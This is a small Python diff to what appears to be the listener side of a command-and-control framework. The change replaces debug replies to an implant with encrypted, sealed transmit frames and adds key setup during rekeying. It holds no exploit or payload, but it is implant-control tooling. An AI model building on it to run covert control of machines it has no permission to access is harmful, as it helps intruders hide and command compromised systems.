@@ -1,5 +1,6 @@
 from lib import instructions
 from lib.crypto import asymmetric
+from lib import transmit
 
 
 def send_manifest(frame, listener):
@@ -18,7 +19,7 @@ def send_manifest(frame, listener):
             "txid": frame['txid']}
     instruction_frame = instructions.create_instruction_frame(data)
     # TODO: value setting
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame)
     return reply_frame
 
 
@@ -32,14 +33,19 @@ def send_initialization(listener):
     data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"lpk": listener.initial_public_key._public_key}]}
     instruction_frame = instructions.create_instruction_frame(data)
     # TODO: cooking
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = transmit.cook_sealed_frame(listener, instruction_frame)
     return reply_frame
 
 
 def rekey(frame, listener):
     data = {}
+
+    listener.ts_pubkey = asymmetric.public_key_from_bytes(listener.config.config['crypto']['ts_pk'])
+    listener.current_private_key = listener.initial_private_key
+    listener.current_public_key = listener.initial_public_key
+
     instruction_frame = instructions.create_instruction_frame(data)
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame)
     return reply_frame
 
 
@@ -61,11 +67,12 @@ def request_command(listener):
     """
     data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"gcmd": listener.initial_public_key._public_key}]}
     instruction_frame = instructions.create_instruction_frame(data)
-    reply_frame = instruction_frame  # Debug, will be encoded once cooked
+    reply_frame = transmit.cook_transmit_frame(listener, instruction_frame)
     return reply_frame
 
 
 def receive_command(frame, listener):
     # TODO: add the command to the implant's queue
     reply_frame = {"tid": frame['transaction_id']}
+    reply_frame = transmit.cook_transmit_frame(listener, reply_frame)
     return reply_frame
